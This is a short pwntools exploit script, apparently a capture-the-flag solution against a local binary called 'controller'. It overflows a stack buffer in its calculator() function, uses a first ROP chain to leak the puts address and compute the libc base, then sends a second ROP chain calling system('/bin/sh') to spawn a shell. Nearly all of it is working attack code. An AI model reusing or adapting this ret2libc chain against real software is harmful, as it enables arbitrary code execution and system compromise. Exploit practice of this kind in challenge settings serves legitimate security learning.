#!/usr/bin/python3

from pwn import *


context(arch='amd64', os = 'linux')
local_bin = "./controller"
elf = ELF(local_bin)
libc = ELF("./libc.so.6")



print (libc.search('/bin/sh'))


p = gdb.debug(local_bin, '''

b *(calculator+150)
continue


''')

#p = process(local_bin)
def ropchain1():
	rop = ROP(elf)
	rop.puts(elf.got['puts']) #pop rdi; ret. 
	rop.call(elf.symbols['main'])
	print(rop.dump())
	return rop.chain()

def ropchain2():
	rop2 = ROP(libc)
	rop2.call(rop2.ret[0])
	rop2.system(next(libc.search(b'/bin/sh\x00')))
	print (rop2.dump())
	return rop2.chain()


#To get into calculator() function, to overflow local_28[28]
p.sendline("-718 -91")
p.recv()
p.sendline("3")
p.recv()

p.sendline(b"A"*40+ropchain1())
p.recvuntil("> Problem ingored\n")
print("="* 99)

puts_base = p.recvline()[:6]
puts_base = puts_base.ljust(8, b"\x00")
puts_base = u64(puts_base)
print(f"[+] puts_base: {hex(puts_base)}")
print("="* 99)


#libc will now add the offset to get the actual machine address of symbols.
libc.address = puts_base - libc.symbols['puts'] 


p.sendline("-718 -91")
p.recv()
p.sendline("3")
p.recv()

p.sendline(b"A"*40+ropchain2())
p.recvuntil("> Problem ingored\n")
print("="* 99)


p.interactive()

#Qrop.call('execve',)